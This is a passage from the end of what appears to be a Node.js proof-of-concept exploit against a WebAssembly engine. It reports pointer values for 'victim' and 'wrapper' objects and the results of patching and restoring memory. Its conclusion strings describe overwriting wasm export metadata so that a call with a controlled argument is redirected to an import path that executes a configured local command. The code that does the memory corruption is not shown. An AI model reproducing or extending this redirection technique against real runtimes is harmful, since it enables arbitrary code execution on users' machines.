  originalPatchClass: classifyPointer(originalPatchValue),
  replacementPatchValue: hex(replacementPatchValue),
  replacementPatchClass: classifyPointer(replacementPatchValue),
  effectiveReplacementPatchValue: hex(effectiveReplacementPatchValue),
  effectiveReplacementPatchClass: classifyPointer(effectiveReplacementPatchValue),
  warmIterations,
  victimAddress: hex(native.victimAddress),
  wrapperAddress: hex(native.wrapperAddress),
  originalDataPtr: hex(native.originalDataPtr),
  beforeA,
  beforeB,
  infoA: infoA.summary,
  infoB: infoB.summary,
  patchedA,
  restoredA,
  patchError,
  callError,
  restoreError,
  rereadAExecWords: rereadAExec ? wordsFromBytes(rereadAExec) : null,
  conclusion: ok
    ? (commandImport
      ? "patching export a metadata makes a(controlled_i32) reach the marker wasm import path with the controlled i32 argument, execute the configured local command marker, then restore"
      : markerImport
      ? "patching export a metadata with export b's matching field makes a(controlled_i32) reach the marker wasm import path with the controlled i32 argument, then restore"
      : "patching export a metadata with export b's matching field changes a(controlled_i32) to the replacement result, then restore")
    : "no reliable wasm export metadata redirection observed",
  ok,
};

fs.writeSync(1, `${JSON.stringify(output, null, 2)}\n`);
process.reallyExit(ok ? 86 : 1);
